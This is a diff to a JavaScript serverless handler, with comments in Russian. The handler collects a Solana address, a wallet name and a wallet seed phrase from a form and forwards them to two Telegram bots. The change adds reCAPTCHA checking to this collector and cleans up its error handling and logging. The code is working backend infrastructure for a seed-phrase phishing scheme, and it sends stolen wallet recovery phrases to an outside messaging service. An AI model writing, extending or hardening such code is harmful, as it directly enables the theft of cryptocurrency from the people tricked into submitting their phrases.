@@ -1,6 +1,6 @@
 const https = require('https');
+const querystring = require('querystring');
 
-// Вспомогательная функция для отправки сообщения (остается без изменений)
 const sendMessageToBot = (botToken, chatId, message) => {
     return new Promise((resolve, reject) => {
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -16,20 +16,54 @@ const sendMessageToBot = (botToken, chatId, message) => {
                 'Content-Type': 'application/json',
                 'Content-Length': Buffer.byteLength(postData)
             }
-        }, (res) => {
-            if (res.statusCode >= 200 && res.statusCode < 300) {
-                resolve(res);
-            } else {
-                let errorData = '';
-                res.on('data', (chunk) => errorData += chunk);
-                res.on('end', () => {
-                    console.error('Telegram API Error:', errorData);
-                    reject(new Error(`Ошибка ответа от Telegram: ${res.statusCode}. Ответ: ${errorData}`));
-                });
-            }
+        }, res => {
+            let body = '';
+            res.on('data', chunk => body += chunk);
+            res.on('end', () => {
+                if (res.statusCode >= 200 && res.statusCode < 300) {
+                    resolve(JSON.parse(body));
+                } else {
+                    reject(new Error(`Ошибка ответа от Telegram: ${res.statusCode}. Ответ: ${body}`));
+                }
+            });
+        });
+        req.on('error', reject);
+        req.write(postData);
+        req.end();
+    });
+};
+
+const verifyRecaptcha = (secret, response) => {
+    return new Promise((resolve, reject) => {
+        const postData = querystring.stringify({
+            secret: secret,
+            response: response
         });
 
-        req.on('error', reject);
+        const options = {
+            hostname: 'www.google.com',
+            port: 443,
+            path: '/recaptcha/api/siteverify',
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Content-Length': Buffer.byteLength(postData)
+            }
+        };
+
+        const req = https.request(options, (res) => {
+            let data = '';
+            res.on('data', (chunk) => data += chunk);
+            res.on('end', () => {
+                try {
+                    resolve(JSON.parse(data));
+                } catch (e) {
+                    reject(e);
+                }
+            });
+        });
+
+        req.on('error', (e) => reject(e));
         req.write(postData);
         req.end();
     });
@@ -37,34 +71,46 @@ const sendMessageToBot = (botToken, chatId, message) => {
 
 
 exports.handler = async (event) => {
-    // --- ДИАГНОСТИЧЕСКАЯ СТРОКА ---
-    // Выводим в лог все переменные окружения, которые "видит" функция
-    console.log('Environment Variables Received by Function:', JSON.stringify(process.env));
-    // -----------------------------
-
     if (event.httpMethod !== 'POST') {
-        return { statusCode: 405, body: 'Method Not Allowed' };
+        return { statusCode: 405, body: JSON.stringify({ message: 'Method Not Allowed' }) };
     }
 
-    const { BOT_TOKEN_1, CHAT_ID_1, BOT_TOKEN_2, CHAT_ID_2 } = process.env;
+    const { 
+        BOT_TOKEN_1, CHAT_ID_1, 
+        BOT_TOKEN_2, CHAT_ID_2, 
+        RECAPTCHA_SECRET_KEY 
+    } = process.env;
 
-    if (!BOT_TOKEN_1 || !CHAT_ID_1 || !BOT_TOKEN_2 || !CHAT_ID_2) {
-        return { 
-            statusCode: 500, 
-            body: JSON.stringify({ message: "Одна или несколько переменных окружения для ботов не настроены на сервере." }) 
+    if (!BOT_TOKEN_1 || !CHAT_ID_1 || !BOT_TOKEN_2 || !CHAT_ID_2 || !RECAPTCHA_SECRET_KEY) {
+        console.error("Одна или несколько переменных окружения не настроены.");
+        return {
+            statusCode: 500,
+            body: JSON.stringify({ message: "Ошибка конфигурации на стороне сервера." })
         };
     }
 
     try {
         const data = JSON.parse(event.body);
         const { solAddress, wallet, seedPhrase } = data;
+        const recaptchaResponse = data['g-recaptcha-response'];
 
-        if (!solAddress || !wallet || !seedPhrase) {
+        if (!solAddress || !wallet || !seedPhrase || !recaptchaResponse) {
             return {
                 statusCode: 400,
-                body: JSON.stringify({ message: "Отсутствуют необходимые данные." })
+                body: JSON.stringify({ message: "Отсутствуют необходимые данные, включая токен reCAPTCHA." })
             };
         }
+
+        // --- Проверка reCAPTCHA ---
+        const recaptchaVerification = await verifyRecaptcha(RECAPTCHA_SECRET_KEY, recaptchaResponse);
+        if (!recaptchaVerification.success) {
+            console.error('Ошибка верификации reCAPTCHA:', recaptchaVerification['error-codes']);
+            return {
+                statusCode: 400,
+                body: JSON.stringify({ message: "Проверка reCAPTCHA не пройдена." })
+            };
+        }
+        // -------------------------
 
         const escapeHTML = (str) => {
             if (typeof str !== 'string') return '';
